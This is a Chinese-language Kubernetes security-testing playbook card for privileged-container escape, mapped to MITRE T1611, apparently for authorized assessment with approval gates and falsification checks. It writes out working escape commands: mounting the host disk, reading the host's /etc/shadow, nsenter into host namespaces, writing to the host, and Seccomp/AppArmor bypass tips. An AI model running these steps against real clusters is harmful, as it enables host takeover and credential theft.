---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-1.8]
mapped_compliance_families: [特权容器, Pod安全]
---

# privileged-container-escape — 特权容器逃逸

容器以 `privileged: true` 运行时拥有宿主机全部 capabilities 与设备访问权，攻击者可绕过 namespace 隔离直接访问宿主机设备、文件系统与命名空间，实现容器逃逸。

---

## 1. 前置条件

- Pod 的 `securityContext.privileged` 设为 `true`
- 特权容器自动拥有全部 capabilities 与设备挂载（/dev 透明可见）
- 未被 AppArmor/Seccomp 强制策略限制（特权容器默认忽略这些策略）

检查命令：
```bash
# [L0] 宿主机观察：检查 Pod 是否为特权容器
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[*].securityContext.privileged}'
# 期望输出: true

# [L0] 宿主机观察：检查 Pod 完整 securityContext
kubectl get pod <pod-name> -n <ns> -o yaml | grep -A5 securityContext
# 期望输出: privileged: true
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 Pod 安全上下文
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[*].securityContext.privileged}'
# 期望输出: true

# [L1] 容器内观察：验证全部 capabilities（特权容器应含 CAP_SYS_ADMIN 等）
kubectl exec -n <ns> <pod-name> -- capsh --print 2>/dev/null | grep -i cap
# 期望输出: Current: = cap_chown,cap_dac_override,...,cap_sys_admin,...,cap_syslog, cap_wake_alarm（含全部 37+ 项）

# [L1] 容器内观察：验证可访问宿主机设备
kubectl exec -n <ns> <pod-name> -- ls /dev | head -20
# 期望输出: 显示 /dev/sda /dev/nvme0n1 等宿主机块设备

# [L1] 容器内观察：验证 namespace 隔离已被瓦解
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep -i cap
# 期望输出: CapEff: 000001ffffffffff（全部 capabilities 位图）

# [L1] 容器内观察：验证是否可访问宿主机文件系统挂载点
kubectl exec -n <ns> <pod-name> -- mount | grep -E 'sda|nvme|host'
# 期望输出: 宿主机块设备未挂载时无输出；特权容器有能力挂载
```

## 3. 攻击验证

```bash
# [L2] 容器内攻击验证：挂载宿主机根文件系统
kubectl exec -n <ns> <pod-name> -- mkdir -p /host
kubectl exec -n <ns> <pod-name> -- mount /dev/sda1 /host 2>/dev/null || kubectl exec -n <ns> <pod-name> -- mount /dev/nvme0n1p1 /host
# 期望输出: 无报错，宿主机根文件系统已挂载到容器内 /host

# [L2] 容器内攻击验证：读取宿主机敏感文件
kubectl exec -n <ns> <pod-name> -- cat /host/etc/shadow
# 期望输出: root:$6$...:...（宿主机 shadow 文件内容）

# [L2] 容器内攻击验证：通过 nsenter 切换到宿主机命名空间执行命令
kubectl exec -n <ns> <pod-name> -- nsenter -t 1 -m -u -i -n -p -- ls /
# 期望输出: 宿主机根目录文件列表（bin boot dev etc ...）

# [L2] 容器内攻击验证：向宿主机写入持久化后门
kubectl exec -n <ns> <pod-name> -- sh -c 'echo "escape-poc marker" > /host/tmp/escape-marker.txt'
# 期望输出: 无报错

# [L2] 宿主机端确认：文件已写入宿主机
ls -la /tmp/escape-marker.txt
# 期望输出: -rw-r--r-- 1 root root ... escape-marker.txt

# [L2] 清理
kubectl exec -n <ns> <pod-name> -- rm /host/tmp/escape-marker.txt
kubectl exec -n <ns> <pod-name> -- umount /host
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机 /tmp 内容
ls -la /tmp/ | sort
# 期望输出: 攻击前无 escape-marker.txt

# [L0] 攻击后环境对比：确认逃逸文件已写入宿主机
ls -la /tmp/ | sort
# 期望输出: 出现 escape-marker.txt

# [L1] 攻击前：容器内无法访问宿主机 shadow（非特权时）
kubectl exec -n <ns> <non-privileged-pod> -- cat /etc/shadow 2>&1
# 期望输出: Permission denied 或 No such file（正常容器隔离）

# [L2] 攻击后：通过特权容器读取宿主机 shadow
kubectl exec -n <ns> <pod-name> -- cat /host/etc/shadow
# 期望输出: root:$6$...:...（宿主机 shadow 内容）→ 证明逃逸成功

# [L2] 攻击前：宿主机 mount 列表无 /host 挂载点
mount | grep /host
# 期望输出: 无输出

# [L2] 攻击后：mount 列表出现 /dev/sda1 on /host
mount | grep /host
# 期望输出: /dev/sda1 on /host type ext4 ...
```

差分结论：攻击前容器无法访问宿主机文件系统，攻击后特权容器成功挂载宿主机根分区并读取 `/etc/shadow`、向宿主机 `/tmp` 写入文件，证明逃逸成功。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制特权容器能力
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含特定 restrict profile → AppArmor 可能限制部分操作

# [L1] 检查 Seccomp 是否在内核层面限制系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若输出 Seccomp: 2 (strict) → mount 等系统调用可能被阻断

# 绕过方式：
# - [L2] 若 mount 系统调用被 Seccomp 阻断但 CAP_SYS_ADMIN 仍在，改用 nsenter 直接进入宿主机 PID 1 namespace
# - [L2] 若块设备路径变化，遍历 /dev 查找可用块设备（lsblk 或 cat /proc/partitions）
# - [L2] 若宿主机根分区不可挂载，通过 /proc/1/root 符号链接访问宿主机文件系统（特权容器有权限）
# - [L1] 若 capsh 不可用，用 grep Cap /proc/1/status 验证 CapEff 位图
```

## 6. 证伪条件

```bash
# [L0] Pod 非特权运行
kubectl get pod <pod-name> -n <ns> -o jsonpath='{.spec.containers[*].securityContext.privileged}'
# 输出: false 或无输出 → 证伪

# [L1] 容器内 capsh 显示不含 CAP_SYS_ADMIN
kubectl exec -n <ns> <pod-name> -- capsh --print 2>/dev/null | grep -i sys_admin
# 输出: 无匹配 → 证伪

# [L1] 容器内无法访问宿主机块设备
kubectl exec -n <ns> <pod-name> -- ls /dev/sda 2>&1
# 输出: No such file or directory → 证伪

# [L2] 容器内 mount 宿主机分区失败
kubectl exec -n <ns> <pod-name> -- mount /dev/sda1 /host 2>&1
# 输出: mount: permission denied → 证伪

# [L1] 容器内 nsenter 受阻
kubectl exec -n <ns> <pod-name> -- nsenter -t 1 -m -u -i -n -p -- ls / 2>&1
# 输出: Operation not permitted → 证伪
```

## 7. 审批级别

- **L2** 容器内攻击验证（挂载宿主机文件系统、写入宿主机文件）→ **Level 4**（访问宿主机文件系统，需人工确认）
- **L1** 容器内探测命令（capsh、ls /dev、mount）→ **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令（kubectl get pod）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否（攻击验证仅读取/写入临时标记文件，清理后还原）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Privilege Escalation / Defense Evasion
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者利用特权容器的全部 capabilities 与设备访问权，挂载宿主机根文件系统或通过 nsenter 切入宿主机命名空间，实现从容器到宿主机的逃逸，进而控制宿主机或其他容器。